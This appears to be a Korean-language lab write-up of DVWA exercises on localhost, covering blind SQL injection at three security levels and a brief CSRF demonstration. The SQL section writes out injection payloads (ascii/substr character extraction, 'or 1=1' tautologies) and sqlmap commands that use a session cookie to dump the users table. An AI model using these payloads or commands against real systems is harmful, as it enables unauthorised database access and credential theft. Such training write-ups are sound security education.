# SQL Injection(Blind)

## Low

<img src ="https://github.com/adakim3297/GBC-WEB---3/blob/main/SI(B)-1.png?raw=true" width="500" height="400"/>

    SELECT first_name, last_name FROM users WHERE user_id = '$id';";

    1' AND ascii(substr((select first_name from users where user_id='1'), 1, 1))>91# 등 숫자를 바꾸며 비교해본다.
<img src ="https://github.com/adakim3297/GBC-WEB---3/blob/main/SI(B)-2.png?raw=true" width="700" height="400"/>

    console.log(document.cookie);를 이용해 개발자 도구에서 PHPSESSID를 알아낸다

<img src ="https://github.com/adakim3297/GBC-WEB---3/blob/main/SI(B)-3.png?raw=true" width="700" height="300"/>

    PHPSESSID를 이용해 sqlmap에서 다양한 정보(데이터베이스, 아이디 정보 등)을 알아낸다.

<img src ="https://github.com/adakim3297/GBC-WEB---3/blob/main/sI(B)-4.png?raw=true" width="700" height="400"/>

    id가 어떤 것인지 알 수 있다.
    
<img src ="https://github.com/adakim3297/GBC-WEB---3/blob/main/SI(B)-5.png?raw=true" width="200" height="150"/>

    python sqlmap.py -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=h9pjp1rqf34n8em188dnuu66ca" -D dvwa -tables
    
    database에 대해 볼 수 있다.

<img src ="https://github.com/adakim3297/GBC-WEB---3/blob/main/SI(B)-6.png?raw=true" width="700" height="400"/>

     python sqlmap.py -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=h9pjp1rqf34n8em188dnuu66ca" -T users -dump

     user에 대한 정보를 볼 수 있다. 

<img src ="https://github.com/adakim3297/GBC-WEB---3/blob/main/SI(B)-7.png?raw=true" width="500" height="300"/>

    1' or 1=1# 
    1' or 1=2#
    .
    .
    .
    1' and 1= 1#
    .
    .

    등 예상을 하며 user ID가 존재하는지 비교하는 방법역시 있다.

## Medium

<img src ="https://github.com/adakim3297/GBC-WEB---3/blob/main/SI(B)%20medium%20-1.png?raw=true" width="500" height="450"/>

    앞서 Low 단계해서 했던 단계를 함께 거치면 된다.

<img src ="https://github.com/adakim3297/GBC-WEB---3/blob/main/SI(B)%20medium-2.png?raw=true" width="500" height="450"/>

    답 : 1 OR 1=1#을 함으로써 해결한다.

<img src ="https://github.com/adakim3297/GBC-WEB---3/blob/main/SI(B)%20medium-3.png?raw=true" width="500" height="450"/>


## High

<img src ="https://github.com/adakim3297/GBC-WEB---3/blob/main/SI(B)%20high-1.png?raw=true" width="500" height="450"/>

    앞서 방법과 동일하게 LIMIT1이 있음을 잊지 않고 마지막에 주석을 달아서 해결한다.

<img src ="https://github.com/adakim3297/GBC-WEB---3/blob/main/SI(B)%20high-2%20.png?raw=true" width="500" height="450"/>
<img src ="https://github.com/adakim3297/GBC-WEB---3/blob/main/SI(B)%20high-3%20high.png?raw=true" width="500" height="450"/>
    1' AND ascii(substr((select first_name from users where user_id='1'), 1, 1))>91#

    1' AND ascii(substr((select first_name from users where user_id='1'), 1, 1))>92#

    .
    .
    .
    1' AND ascii(substr((select first_name from users where user_id='1'), 1, 1))>96#
    등 숫자를 바꾸며 해결하는 방법도 있다.


# CSRF

## Cross-Site Request Forgery 의 약어 이다

* 사이트 사이의 위조 요청이라는 뜻으로 사용자가 자신의 의지와는 무관하게 공격자가 의도한 행위(수정, 삭제, 등록 등)를 웹사이트에 요청하게 하는 공격이다.
* 공격자는 웹사이트가 신뢰하고 있는 사용자의 권한을 이용해서 중요 행동을 실행 한다
* 웹사이트에서는 출처가 신뢰할 만한 곳이기에 공격에 노출되는 것이다.

* shor URL이라고 필요한 부분만 기존의 URL에서 수정, 삭제등을 하는 것이다.

<img src ="https://github.com/adakim3297/GBC-WEB---3/blob/main/CSRF%20low%20-1.png?raw=true" width="800" height="450"/>

    GET 방식으로 password를 URL에서 볼 수 있다.

<img src ="https://github.com/adakim3297/GBC-WEB---3/blob/main/CSRF%20low%20-2.png?raw=true" width="500" height="450"/>

    URL에 있는 password_new = password123&password_conf=password123을 직접적으로 볼 수 있고 로그인을 할때 password123으로 하면 되는지 확인한다.

<img src ="https://github.com/adakim3297/GBC-WEB---3/blob/main/CSRF%20low-3.png?raw=true" width="500" height="450"/>

<img src ="https://github.com/adakim3297/GBC-WEB---3/blob/main/CSRF%20low-4.png?raw=true" width="500" height="450"/>

    기존의 password가 아닌 바뀐 password로 접속이 됨을 알 수 있다.
